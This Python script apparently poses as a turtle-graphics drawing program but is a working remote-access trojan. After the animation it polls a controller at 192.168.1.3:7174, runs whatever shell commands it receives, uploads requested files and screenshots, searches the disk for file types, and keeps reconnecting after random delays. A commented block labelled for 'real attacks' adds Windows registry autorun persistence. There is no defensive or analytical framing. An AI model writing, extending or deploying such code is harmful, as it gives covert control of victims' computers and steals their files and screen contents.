import requests
import os
import subprocess
import time
import random
import turtle
import tempfile
import shutil
from requests.sessions import dispatch_hook
from PIL import ImageGrab

wn = turtle.Screen()
turtle.bgcolor("black")
turtle.shape("turtle")
t5 = turtle.Turtle()
t5.speed("fastest")
for i in range(10):
    for i in range(4):
        t5.pu()
        t5.goto(500, 200)
        t5.pd()
        t5.color("cyan")
        t5.pensize(3)
        t5.circle(50, steps=4)
        t5.right(100)
t5.speed("fastest")
turtle.done()

# ONLY USE THIS IN REAL ATTACKS : NOT TO BE USED ON THIS PC

# import shutil
# import winreg as wreg

# path = os.getcwd().strip("/n")

# Null, userprof = subprocess.check_output(
#     "set USERPROFILE",
#     shell=True,
#     stdout=subprocess.PIPE,
#     stderr=subprocess.PIPE,
#     stdin=subprocess.PIPE,
# ).decode().split('=')

# destination = userprof.strip('\n\r') + '\\Documents\\' + 'pop.exe'

# if not os.path.exists(destination):
#     shutil.copyfile(path+'\pop.exe',destination)
#     key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,wreg.KEY_ALL_ACCESS)
#     wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
#     key.Close()

urllink = "http://192.168.1.3:7174"

def changeDirectory(path):
    try:
        os.chdir(path)
    except Exception:
        print("..........")

def connect():
    while True:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
        }
        req = requests.get(urllink, headers=headers)
        command = req.text
        newfile = open('newfile.txt','a')
        newfile.write('ha! ha! ha! ha! ha!')
        newfile.close()
        if "exit" in command:
            return 1
        elif "fetch" in command:
            fet, path = command.split(" ")
            if os.path.exists(path):
                url = urllink + "/data"
                files = {"file": open(path, "rb")}
                r = requests.post(url, files=files, headers=headers)
            else:
                post_response = requests.post(url=urllink, data="[-] Couldn't get file.")
        elif "ss" in command:

            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg","JPEG")

            url = urllink + "/data"
            files = {"file": open(dirpath + "\img.jpg", "rb")}
            r = requests.post(url, files=files)

            files['file'].close()
            shutil.rmtree(dirpath)
        elif 'cd' in command:
            chandir, path = command.split(" ")
            changeDirectory(path)
        elif "search" in command:
            command = command[7:]
            path, ext = command.split('*')
            lists = ''

            for dirpath, dirname, files in os.walk(path):
                for file in files:
                    if file.endswith(ext):
                        lists = lists + '\n' + os.path.join(dirpath, file)
            requests.post(url=urllink, data=lists)

        else:
            CMD = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            post_response = requests.post(url=urllink, data=CMD.stdout.read())
            post_response = requests.post(url=urllink, data=CMD.stderr.read())
        time.sleep(3)


while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1, 6000)
        time.sleep(int(sleep_for))
        pass
